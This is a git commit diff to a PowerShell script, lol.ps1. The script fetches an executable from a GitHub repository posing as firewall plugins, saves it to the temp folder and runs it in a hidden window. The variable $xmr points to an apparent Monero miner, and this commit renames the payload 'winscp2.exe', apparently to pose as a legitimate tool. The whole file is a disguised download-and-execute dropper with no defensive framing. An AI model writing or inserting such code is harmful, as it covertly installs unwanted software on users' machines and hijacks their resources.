8cf0aabd77e1e6a63be2781077fafa580b524a86
c4kroot <83622175+c4kroot@users.noreply.github.com>
2022-07-07 15:07:04 -0300

    Update lol.ps1

--- lol.ps1
+++ lol.ps1
@@ -1,10 +1,10 @@
 $cc = "https://github.com/c4kroot/Plugins-Files-for-Firewall/raw/main"
 $is64 = (([Array](Get-WmiObject -Query "select AddressWidth from Win32_Processor"))[0].AddressWidth -eq 64)
-$xmr = "$cc/checkit2.exe"
+$xmr = "$cc/winscp2.exe"
 
 if ($is64) {
 	$xmr = "$cc/checkit2.exe"
 }
 
-(New-Object Net.WebClient).DownloadFile("$cc/checkit2.exe", "$env:TMP\xdlolxd.exe")
-Start-Process "$env:TMP\xdlolxd.exe"  -windowstyle hidden
+(New-Object Net.WebClient).DownloadFile("$cc/winscp2.exe", "$env:TMP\winscp2.exe")
+Start-Process "$env:TMP\winscp2.exe"  -windowstyle hidden
